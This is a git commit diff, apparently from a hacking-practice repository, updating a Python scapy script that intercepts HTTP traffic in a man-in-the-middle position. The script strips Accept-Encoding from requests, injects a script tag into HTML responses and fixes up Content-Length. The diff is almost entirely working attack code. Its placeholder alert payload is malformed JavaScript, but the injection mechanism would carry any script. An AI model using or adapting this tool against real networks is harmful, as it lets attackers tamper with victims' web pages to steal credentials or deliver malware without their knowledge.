75a8755c67e21c10edfb2878bd55ac09974fa47f
Ryan Spishock <22054759+rspishock@users.noreply.github.com>
2020-08-17 07:17:26 -0400

    Complete code_injector.py and refactor code

--- code_injector.py
+++ code_injector.py
@@ -20,26 +20,30 @@ def process_packet(packet):
     """Processes the packet and processes payload."""
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
-        load = scapy_packet[scapy.Raw].load
-        if scapy_packet[scapy.TCP].dport == 80:
-            print('[+] Request')
-            load = re.sub('Accept-Encoding:.*?\\r\\n', '', load)
+        try:
+            load = scapy_packet[scapy.Raw].load.decode()
+            if scapy_packet[scapy.TCP].dport == 80:
+                print('[+] Request')
+                load = re.sub('Accept-Encoding:.*?\\r\\n', '', load)
 
-        elif scapy_packet[scapy.TCP].sport == 80:
-            print('[+] Response')
-            injection_code = '<script>alert(\'test\);</script>'
-            #Replaces the closing body tag in the HTML file with a JavaScript alert and new closing body tag
-            load = load.replace('</body>', injection_code + '</body>')
-            # matches string Content-Length <some number>, extracting only the number
-            content_length_search = re.search('(?:Content-Length:\s)(\d*)', load)
-            if content_length_search:
-                content_length = content_length_search.group(1)
-                new_content_length = int(content_length) + len(injection_code)
-                load = load.replace(content_length, str(new_content_length))
+            elif scapy_packet[scapy.TCP].sport == 80:
+                print('[+] Response')
+                injection_code = '<script>alert(\'test\);</script>'
+                #Replaces the closing body tag in the HTML file with a JavaScript alert and new closing body tag
+                load = load.replace('</body>', injection_code + '</body>')
+                # matches string Content-Length <some number>, extracting only the number
+                content_length_search = re.search('(?:Content-Length:\s)(\d*)', load)
+                if content_length_search and 'text/html' in load:
+                    content_length = content_length_search.group(1)
+                    new_content_length = int(content_length) + len(injection_code)
+                    load = load.replace(content_length, str(new_content_length))
 
-        if load != scapy_packet[scapy.Raw].load:
-            new_packet = set_load(scapy_packet, load)
-            packet.set_payload(str(new_packet))
+            if load != scapy_packet[scapy.Raw].load:
+                new_packet = set_load(scapy_packet, load)
+                packet.set_payload(bytes(new_packet))
+
+        except UnicodeDecodeError:
+            pass
 
     packet.accept()
 
